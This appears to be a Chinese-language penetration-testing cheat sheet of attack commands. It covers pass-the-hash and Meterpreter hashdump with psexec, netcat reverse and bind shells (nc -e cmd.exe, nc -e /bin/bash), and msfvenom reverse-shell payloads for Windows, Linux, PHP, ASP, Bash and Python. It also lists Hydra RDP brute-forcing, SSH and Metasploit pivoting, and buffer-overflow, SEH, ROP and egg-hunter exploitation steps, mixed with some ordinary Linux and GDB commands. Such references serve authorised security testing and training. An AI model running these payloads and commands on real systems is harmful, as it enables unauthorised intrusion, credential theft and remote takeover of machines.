<h3 id="获取哈希值"><a href="#获取哈希值" class="headerlink" title="获取哈希值"></a>获取哈希值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/byt3bl33d3r/pth-toolkit</span><br><span class="line">pth-winexe -U hash //IP cmd</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">apt-get install freerdp-x11</span><br><span class="line">xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</span><br><span class="line"></span><br><span class="line">在或者</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</span><br><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<h3 id="使用-Hashcat-破解密码"><a href="#使用-Hashcat-破解密码" class="headerlink" title="使用 Hashcat 破解密码"></a>使用 Hashcat 破解密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 400 -a 0 hash /root/rockyou.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-NC-抓取-Banner-信息"><a href="#使用-NC-抓取-Banner-信息" class="headerlink" title="使用 NC 抓取 Banner 信息"></a>使用 NC 抓取 Banner 信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.10 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.0.10</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line">Referrer: www.example.com</span><br><span class="line">&lt;enter&gt;</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure>

<h3 id="使用-NC-在-Windows-上反弹-shell"><a href="#使用-NC-在-Windows-上反弹-shell" class="headerlink" title="使用 NC 在 Windows 上反弹 shell"></a>使用 NC 在 Windows 上反弹 shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c:&gt;nc -Lp 31337 -vv -e cmd.exe</span><br><span class="line">nc 192.168.0.10 31337</span><br><span class="line">c:&gt;nc example.com 80 -e cmd.exe</span><br><span class="line">nc -lp 80</span><br><span class="line"></span><br><span class="line">nc -lp 31337 -e /bin/bash</span><br><span class="line">nc 192.168.0.10 31337</span><br><span class="line">nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000</span><br></pre></td></tr></table></figure>

<h3 id="查找-SUID-SGID-root-文件"><a href="#查找-SUID-SGID-root-文件" class="headerlink" title="查找 SUID\SGID root 文件"></a>查找 SUID\SGID root 文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 查找 SUID root 文件</span><br><span class="line">find / -user root -perm -4000 -print</span><br><span class="line"></span><br><span class="line"># 查找 SGID root 文件:</span><br><span class="line">find / -group root -perm -2000 -print</span><br><span class="line"></span><br><span class="line"># 查找 SUID 和 SGID 文件:</span><br><span class="line">find / -perm -4000 -o -perm -2000 -print</span><br><span class="line"></span><br><span class="line"># 查找不属于任何用户的文件:</span><br><span class="line">find / -nouser -print</span><br><span class="line"></span><br><span class="line"># 查找不属于任何用户组的文件:</span><br><span class="line">find / -nogroup -print</span><br><span class="line"></span><br><span class="line"># 查找软连接及其指向:</span><br><span class="line">find / -type l -ls</span><br></pre></td></tr></table></figure>

<h3 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="Python-Ruby-PHP-HTTP-服务器"><a href="#Python-Ruby-PHP-HTTP-服务器" class="headerlink" title="Python\Ruby\PHP HTTP 服务器"></a>Python\Ruby\PHP HTTP 服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line">python3 -m http.server</span><br><span class="line">ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, </span><br><span class="line"> ocumentRoot =&gt; Dir.pwd).start&quot;</span><br><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>

<h3 id="获取进程对应的-PID"><a href="#获取进程对应的-PID" class="headerlink" title="获取进程对应的 PID"></a>获取进程对应的 PID</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuser -nv tcp 80</span><br><span class="line">fuser -k -n tcp 80</span><br></pre></td></tr></table></figure>

<h3 id="使用-Hydra-爆破-RDP"><a href="#使用-Hydra-爆破-RDP" class="headerlink" title="使用 Hydra 爆破 RDP"></a>使用 Hydra 爆破 RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</span><br></pre></td></tr></table></figure>

<h3 id="挂载远程-Windows-共享文件夹"><a href="#挂载远程-Windows-共享文件夹" class="headerlink" title="挂载远程 Windows 共享文件夹"></a>挂载远程 Windows 共享文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</span><br></pre></td></tr></table></figure>

<h3 id="Kali-下编译-Exploit"><a href="#Kali-下编译-Exploit" class="headerlink" title="Kali 下编译 Exploit"></a>Kali 下编译 Exploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 位)</span><br><span class="line">gcc -m64 -o output hello.c (64 位)</span><br></pre></td></tr></table></figure>

<h3 id="Kali-下编译-Windows-Exploit"><a href="#Kali-下编译-Windows-Exploit" class="headerlink" title="Kali 下编译 Windows Exploit"></a>Kali 下编译 Windows Exploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line">cd /root/.wine/drive_c/windows</span><br><span class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line">cd /root/.wine/drive_c/MinGW/bin</span><br><span class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</span><br><span class="line">wine ability.exe</span><br></pre></td></tr></table></figure>

<h3 id="NASM-命令"><a href="#NASM-命令" class="headerlink" title="NASM 命令"></a>NASM 命令</h3><p>注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f bin -o payload.bin payload.asm</span><br><span class="line">nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</span><br></pre></td></tr></table></figure>

<h3 id="SSH-穿透"><a href="#SSH-穿透" class="headerlink" title="SSH 穿透"></a>SSH 穿透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1080 -p 22 user@IP</span><br><span class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</span><br><span class="line">proxychains commands target</span><br></pre></td></tr></table></figure>

<h3 id="SSH-穿透从一个网络到另一个网络"><a href="#SSH-穿透从一个网络到另一个网络" class="headerlink" title="SSH 穿透从一个网络到另一个网络"></a>SSH 穿透从一个网络到另一个网络</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1080 -p 22 user1@IP1</span><br><span class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</span><br><span class="line">proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2</span><br><span class="line">Add socks4 127.0.0.1 1081 in /etc/proxychains.conf</span><br><span class="line">proxychains commands target</span><br></pre></td></tr></table></figure>

<h3 id="使用-metasploit-进行穿透"><a href="#使用-metasploit-进行穿透" class="headerlink" title="使用 metasploit 进行穿透"></a>使用 metasploit 进行穿透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">route add X.X.X.X 255.255.255.0 1</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">run</span><br><span class="line">proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"># https://www.offensive-security.com/metasploit-unleashed/pivoting/</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IP Address  : 10.1.13.3</span><br><span class="line">meterpreter &gt; run autoroute -s 10.1.13.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">10.1.13.0          255.255.255.0      Session 1</span><br><span class="line">meterpreter &gt; Ctrl+Z</span><br><span class="line">msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set RHOST 10.1.13.2</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IP Address  : 10.1.13.2</span><br></pre></td></tr></table></figure>

<h3 id="基于-CSV-文件查询-Exploit-DB"><a href="#基于-CSV-文件查询-Exploit-DB" class="headerlink" title="基于 CSV 文件查询 Exploit-DB"></a>基于 CSV 文件查询 Exploit-DB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/offensive-security/exploit-database.git</span><br><span class="line">cd exploit-database</span><br><span class="line">./searchsploit –u</span><br><span class="line">./searchsploit apache 2.2</span><br><span class="line">./searchsploit &quot;Linux Kernel&quot;</span><br><span class="line"></span><br><span class="line">cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3</span><br></pre></td></tr></table></figure>

<h3 id="MSF-Payloads"><a href="#MSF-Payloads" class="headerlink" title="MSF Payloads"></a>MSF Payloads</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成在-Linux-下反弹的-Meterpreter-Shell"><a href="#MSF-生成在-Linux-下反弹的-Meterpreter-Shell" class="headerlink" title="MSF 生成在 Linux 下反弹的 Meterpreter Shell"></a>MSF 生成在 Linux 下反弹的 Meterpreter Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-Shell-C-Shellcode"><a href="#MSF-生成反弹-Shell-C-Shellcode" class="headerlink" title="MSF 生成反弹 Shell (C Shellcode)"></a>MSF 生成反弹 Shell (C Shellcode)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-Python-Shell"><a href="#MSF-生成反弹-Python-Shell" class="headerlink" title="MSF 生成反弹 Python Shell"></a>MSF 生成反弹 Python Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-ASP-Shell"><a href="#MSF-生成反弹-ASP-Shell" class="headerlink" title="MSF 生成反弹 ASP Shell"></a>MSF 生成反弹 ASP Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-Bash-Shell"><a href="#MSF-生成反弹-Bash-Shell" class="headerlink" title="MSF 生成反弹 Bash Shell"></a>MSF 生成反弹 Bash Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-PHP-Shell"><a href="#MSF-生成反弹-PHP-Shell" class="headerlink" title="MSF 生成反弹 PHP Shell"></a>MSF 生成反弹 PHP Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php</span><br><span class="line">add &lt;?php at the beginning</span><br><span class="line">perl -i~ -0777pe&#x27;s/^/&lt;?php \n/&#x27; shell.php</span><br></pre></td></tr></table></figure>

<h3 id="MSF-生成反弹-Win-Shell"><a href="#MSF-生成反弹-Win-Shell" class="headerlink" title="MSF 生成反弹 Win Shell"></a>MSF 生成反弹 Win Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="Linux-常用安全命令"><a href="#Linux-常用安全命令" class="headerlink" title="Linux 常用安全命令"></a>Linux 常用安全命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># 使用 uid 查找对应的程序</span><br><span class="line">find / -uid 0 -perm -4000</span><br><span class="line"></span><br><span class="line"># 查找哪里拥有写权限</span><br><span class="line">find / -perm -o=w</span><br><span class="line"></span><br><span class="line"># 查找名称中包含点和空格的文件</span><br><span class="line">find / -name &quot; &quot; -print</span><br><span class="line">find / -name &quot;..&quot; -print</span><br><span class="line">find / -name &quot;. &quot; -print</span><br><span class="line">find / -name &quot; &quot; -print</span><br><span class="line"></span><br><span class="line"># 查找不属于任何人的文件</span><br><span class="line">find / -nouser</span><br><span class="line"></span><br><span class="line"># 查找未链接的文件</span><br><span class="line">lsof +L1</span><br><span class="line"></span><br><span class="line"># 获取进程打开端口的信息</span><br><span class="line">lsof -i</span><br><span class="line"></span><br><span class="line"># 看看 ARP 表中是否有奇怪的东西</span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line"># 查看所有账户</span><br><span class="line">getent passwd</span><br><span class="line"></span><br><span class="line"># 查看所有用户组</span><br><span class="line">getent group</span><br><span class="line"></span><br><span class="line"># 列举所有用户的 crontabs</span><br><span class="line">for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done</span><br><span class="line"></span><br><span class="line"># 生成随机密码</span><br><span class="line">cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=’|fold -w 12| head -n 4</span><br><span class="line"></span><br><span class="line"># 查找所有不可修改的文件</span><br><span class="line">find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’</span><br><span class="line"></span><br><span class="line"># 使文件不可修改</span><br><span class="line">chattr -i file</span><br></pre></td></tr></table></figure>

<h3 id="Windows-缓冲区溢出利用命令"><a href="#Windows-缓冲区溢出利用命令" class="headerlink" title="Windows 缓冲区溢出利用命令"></a>Windows 缓冲区溢出利用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f c</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c</span><br><span class="line"></span><br><span class="line">COMMONLY USED BAD CHARACTERS:</span><br><span class="line">\x00\x0a\x0d\x20                              For http request</span><br><span class="line">\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</span><br><span class="line"></span><br><span class="line"># 常用命令:</span><br><span class="line">pattern create</span><br><span class="line">pattern offset (EIP Address)</span><br><span class="line">pattern offset (ESP Address)</span><br><span class="line">add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )</span><br><span class="line"></span><br><span class="line">!pvefindaddr pattern_create 5000</span><br><span class="line">!pvefindaddr suggest</span><br><span class="line">!pvefindaddr modules</span><br><span class="line">!pvefindaddr nosafeseh</span><br><span class="line"></span><br><span class="line">!mona config -set workingfolder C:\Mona\%p</span><br><span class="line">!mona config -get workingfolder</span><br><span class="line">!mona mod</span><br><span class="line">!mona bytearray -b &quot;\x00\x0a&quot;</span><br><span class="line">!mona pc 5000</span><br><span class="line">!mona po EIP</span><br><span class="line">!mona suggest</span><br></pre></td></tr></table></figure>

<h3 id="SEH-–-结构化异常处理"><a href="#SEH-–-结构化异常处理" class="headerlink" title="SEH – 结构化异常处理"></a>SEH – 结构化异常处理</h3><p>注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</span><br><span class="line"># http://baike.baidu.com/view/243131.htm</span><br><span class="line">!mona suggest</span><br><span class="line">!mona nosafeseh</span><br><span class="line">nseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)</span><br><span class="line">iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</span><br></pre></td></tr></table></figure>

<h3 id="ROP-DEP"><a href="#ROP-DEP" class="headerlink" title="ROP (DEP)"></a>ROP (DEP)</h3><p>注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p>
<p>DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/Return-oriented_programming</span><br><span class="line"># https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</span><br><span class="line"># https://en.wikipedia.org/wiki/Data_Execution_Prevention</span><br><span class="line"># http://baike.baidu.com/item/DEP/7694630</span><br><span class="line">!mona modules</span><br><span class="line">!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;</span><br><span class="line">!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)</span><br></pre></td></tr></table></figure>

<h3 id="ASLR-–-地址空间格局随机化"><a href="#ASLR-–-地址空间格局随机化" class="headerlink" title="ASLR – 地址空间格局随机化"></a>ASLR – 地址空间格局随机化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/Address_space_layout_randomization</span><br><span class="line"># http://baike.baidu.com/view/3862310.htm</span><br><span class="line">!mona noaslr</span><br></pre></td></tr></table></figure>

<h3 id="寻蛋-EGG-Hunter-技术"><a href="#寻蛋-EGG-Hunter-技术" class="headerlink" title="寻蛋(EGG Hunter)技术"></a>寻蛋(EGG Hunter)技术</h3><p>Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自<a target="_blank" rel="noopener" href="http://www.pediy.com/kssd/pediy11/120392.html">看雪论坛</a>，更多详情可以查阅我在代码注释中增加的链接。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</span><br><span class="line"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</span><br><span class="line"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</span><br><span class="line">!mona jmp -r esp</span><br><span class="line">!mona egg -t lxxl</span><br><span class="line">\xeb\xc4 (jump backward -60)</span><br><span class="line">buff=lxxllxxl+shell</span><br><span class="line">!mona egg -t &#x27;w00t&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="GDB-Debugger-常用命令"><a href="#GDB-Debugger-常用命令" class="headerlink" title="GDB Debugger 常用命令"></a>GDB Debugger 常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 设置断点</span><br><span class="line">break *_start</span><br><span class="line"></span><br><span class="line"># 执行下一个命令</span><br><span class="line">next</span><br><span class="line">step</span><br><span class="line">n</span><br><span class="line">s</span><br><span class="line"></span><br><span class="line"># 继续执行</span><br><span class="line">continue</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"># 数据</span><br><span class="line">checking &#x27;REGISTERS&#x27; and &#x27;MEMORY&#x27;</span><br><span class="line"></span><br><span class="line"># 显示寄存器的值: (Decimal,Binary,Hex)</span><br><span class="line">print /d –&gt; Decimal</span><br><span class="line">print /t –&gt; Binary</span><br><span class="line">print /x –&gt; Hex</span><br><span class="line">O/P :</span><br><span class="line">(gdb) print /d $eax</span><br><span class="line">$17 = 13</span><br><span class="line">(gdb) print /t $eax</span><br><span class="line">$18 = 1101</span><br><span class="line">(gdb) print /x $eax</span><br><span class="line">$19 = 0xd</span><br><span class="line">(gdb)</span><br><span class="line"></span><br><span class="line"># 显示特定内存地址的值</span><br><span class="line">command : x/nyz (Examine)</span><br><span class="line">n –&gt; Number of fields to display ==&gt;</span><br><span class="line">y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)</span><br><span class="line">z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</span><br></pre></td></tr></table></figure>

